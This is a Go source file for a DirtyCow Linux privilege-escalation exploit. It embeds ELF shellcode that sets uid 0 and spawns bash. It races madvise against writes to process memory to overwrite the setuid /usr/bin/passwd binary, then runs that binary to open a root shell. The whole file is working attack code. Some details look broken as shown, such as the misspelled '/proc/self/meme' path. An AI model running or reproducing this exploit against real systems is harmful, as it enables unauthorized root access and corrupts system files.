package main

import (
	"bytes"
	"fmt"
	"log"
	"os"
	"os/exec"
	"syscall"
	"time"
)

var mapp uintptr

var signals = make(chan bool, 2)

const SuidBinary = "/usr/bin/passwd"

var sc = []byte{
	0x7f, 0x45, 0x4c, 0x46, 0x01, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x03, 0x00, 0x01, 0x00, 0x00, 0x00,
	0x54, 0x80, 0x04, 0x08, 0x34, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x34, 0x00, 0x20, 0x00, 0x01, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x80, 0x04, 0x08, 0x00, 0x80, 0x04, 0x08, 0x88, 0x00, 0x00, 0x00,
	0xbc, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00,
	0x31, 0xdb, 0x6a, 0x17, 0x58, 0xcd, 0x80, 0x6a, 0x0b, 0x58, 0x99, 0x52,
	0x66, 0x68, 0x2d, 0x63, 0x89, 0xe7, 0x68, 0x2f, 0x73, 0x68, 0x00, 0x68,
	0x2f, 0x62, 0x69, 0x6e, 0x89, 0xe3, 0x52, 0xe8, 0x0a, 0x00, 0x00, 0x00,
	0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x62, 0x61, 0x73, 0x68, 0x00, 0x57, 0x53,
	0x89, 0xe1, 0xcd, 0x80,
}

func madvise() {
	for i := 0; i < 1000000; i++ {
		select {
		case <-signals:
			fmt.Println("madvise done")
		default:
			syscall.Syscall(syscall.SYS_MADVISE, mapp, uintptr(100), syscall.MADV_DONTNEED)
		}

	}
}

func procselfmem(payload []byte) {

	f, err := os.OpenFile("/proc/self/meme", syscall.O_RDWR, 0)

	if err != nil {
		log.Fatalln(err)
	}

	for i := 0; i < 100000; i++ {
		select {
		case <-signals:
			fmt.Println("processselfmem done")
			return
		default:
			syscall.Syscall(syscall.SYS_LSEEK, f.Fd(), mapp, uintptr(os.SEEK_SET))
			f.Write(payload)
		}

	}
}

func waitForWrite() {
	buf := make([]byte, len(sc))

	for {
		f, err := os.Open(SuidBinary)

		if err != nil {
			log.Fatalln(err)
		}

		if _, err := f.Read(buf); err != nil {
			log.Fatalln(err)
		}

		f.Close()

		if bytes.Compare(buf, sc) == 0 {
			fmt.Println("write done")
			break
		}

		time.Sleep(1 * time.Second)
	}

	signals <- true
	signals <- true
	fmt.Println("Popping root shell")
	fmt.Println("Don't forget to restore /tmp/bak")

	attr := os.ProcAttr{
		Files: []*os.File{os.Stdin, os.Stdout, os.Stderr},
	}

	proc, err := os.StartProcess(SuidBinary, []string{SuidBinary}, &attr)

	if err != nil {
		log.Fatalln(err)
	}

	proc.Wait()

	os.Exit(0)
}

func main() {

	fmt.Println("DirtyCow root privilege escalation")
	fmt.Printf("Backing up %s.. to /tmp/bak\n", SuidBinary)

	backup := exec.Command("cp", SuidBinary, "/tmp/bak")

	if err := backup.Run(); err != nil {
		log.Fatalln()
	}

	f, err := os.OpenFile(SuidBinary, os.O_RDONLY, 0600)

	if err != nil {
		log.Fatalln(err)
	}

	st, err := f.Stat()

	if err != nil {
		log.Fatalln(err)
	}

	fmt.Printf("Size of binary is: %d\n", st)

	payload := make([]byte, st.Size())

	for i, _ := range payload {
		payload[i] = 0x90
	}

	for i, v := range sc {
		payload[i] = v
	}

	mapp, _, _ = syscall.Syscall6(
		syscall.SYS_MMAP,
		uintptr(0),
		uintptr(st.Size()),
		uintptr(syscall.PROT_READ),
		uintptr(syscall.MAP_PRIVATE),
		f.Fd(),
		0,
	)

	fmt.Printf("Racing this might take a while ...\n")

	go madvise()
	go procselfmem(payload)
	waitForWrite()
}
